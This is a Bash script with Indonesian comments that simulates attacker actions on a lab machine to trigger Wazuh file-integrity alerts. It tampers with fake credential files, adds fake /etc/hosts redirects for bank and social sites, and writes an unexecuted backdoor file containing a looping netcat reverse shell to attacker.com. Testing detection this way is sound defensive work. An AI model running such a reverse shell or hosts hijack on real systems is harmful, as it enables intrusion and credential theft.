#!/bin/bash
# ===================================================
# Simulasi File Integrity Monitoring (FIM) Attack
# Jalankan di Agent 3
# ===================================================
# Usage: sudo bash attack-fim.sh
# ===================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${RED}=================================================${NC}"
echo -e "${RED}   SIMULASI: FILE INTEGRITY MONITORING            ${NC}"
echo -e "${RED}=================================================${NC}"
echo ""
echo -e "${YELLOW}[WARNING] Ini hanya simulasi untuk tujuan edukasi!${NC}"
echo ""

# Cek root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[ERROR] Jalankan dengan sudo!${NC}"
    exit 1
fi

# ====== SETUP ======
echo -e "${YELLOW}[SETUP] Membuat direktori test...${NC}"
mkdir -p /tmp/fim-test
echo -e "${GREEN}  /tmp/fim-test created${NC}"
echo ""

# ====== Simulasi 1: File Creation ======
echo -e "${YELLOW}[1/6] Creating sensitive files...${NC}"
echo "DATABASE_URL=mysql://admin:password123@localhost:3306/production" > /tmp/fim-test/database.env
echo "API_KEY=sk-live-1234567890abcdef" > /tmp/fim-test/api-keys.txt
echo "AWS_SECRET=AKIAIOSFODNN7EXAMPLE" > /tmp/fim-test/aws-credentials.txt
echo -e "${GREEN}  3 files created (database.env, api-keys.txt, aws-credentials.txt)${NC}"
echo ""

echo -e "${YELLOW}  Menunggu 30 detik agar Wazuh initial scan selesai...${NC}"
sleep 30

# ====== Simulasi 2: File Modification ======
echo -e "${YELLOW}[2/6] Modifying files (simulating attacker tampering)...${NC}"
echo "DATABASE_URL=mysql://hacker:pwned@evil-server.com:3306/stolen" > /tmp/fim-test/database.env
echo "API_KEY=sk-live-STOLEN_BY_ATTACKER" > /tmp/fim-test/api-keys.txt
echo "MALICIOUS_PAYLOAD=true" >> /tmp/fim-test/aws-credentials.txt
echo -e "${GREEN}  3 files modified${NC}"
echo ""
sleep 5

# ====== Simulasi 3: Permission Change ======
echo -e "${YELLOW}[3/6] Changing file permissions (security weakening)...${NC}"
chmod 777 /tmp/fim-test/database.env
chmod 777 /tmp/fim-test/api-keys.txt
chown nobody:nogroup /tmp/fim-test/aws-credentials.txt
echo -e "${GREEN}  Permissions changed to 777 (world-readable/writable)${NC}"
echo ""
sleep 5

# ====== Simulasi 4: File Deletion ======
echo -e "${YELLOW}[4/6] Deleting files (covering tracks)...${NC}"
rm -f /tmp/fim-test/aws-credentials.txt
echo -e "${GREEN}  aws-credentials.txt deleted${NC}"
echo ""
sleep 5

# ====== Simulasi 5: Modify system config ======
echo -e "${YELLOW}[5/6] Modifying /etc/hosts (DNS hijacking simulation)...${NC}"
cp /etc/hosts /etc/hosts.backup.fim-demo
echo "" >> /etc/hosts
echo "# === MALICIOUS ENTRIES (DEMO) ===" >> /etc/hosts
echo "10.10.10.10 google.com" >> /etc/hosts
echo "10.10.10.10 facebook.com" >> /etc/hosts
echo "10.10.10.10 bank.com" >> /etc/hosts
echo -e "${GREEN}  /etc/hosts modified with fake DNS entries${NC}"
echo ""
sleep 5

# ====== Simulasi 6: Create suspicious scripts ======
echo -e "${YELLOW}[6/6] Creating suspicious scripts...${NC}"
cat > /tmp/fim-test/backdoor.sh << 'SCRIPT'
#!/bin/bash
# Simulated backdoor script
while true; do
    nc -e /bin/bash attacker.com 4444 2>/dev/null
    sleep 60
done
SCRIPT
chmod +x /tmp/fim-test/backdoor.sh

cat > /tmp/fim-test/keylogger.py << 'SCRIPT'
#!/usr/bin/env python3
# Simulated keylogger (NOT functional, just for FIM detection)
import os
print("This is a simulated keylogger for demo purposes only")
SCRIPT
chmod +x /tmp/fim-test/keylogger.py

echo -e "${GREEN}  backdoor.sh dan keylogger.py created${NC}"
echo ""

echo -e "${RED}=================================================${NC}"
echo -e "${GREEN}SIMULASI FIM SELESAI!${NC}"
echo ""
echo -e "${YELLOW}Cek Wazuh Dashboard:${NC}"
echo "  1. Login ke Dashboard"
echo "  2. Buka Integrity Monitoring module"
echo "  3. Atau filter: rule.groups: syscheck"
echo "  4. Lihat: file added, modified, deleted events"
echo ""
echo -e "${YELLOW}CLEANUP (jalankan setelah demo selesai):${NC}"
echo "  sudo cp /etc/hosts.backup.fim-demo /etc/hosts"
echo "  sudo rm -rf /tmp/fim-test"
echo "  sudo rm /etc/hosts.backup.fim-demo"
echo -e "${RED}=================================================${NC}"
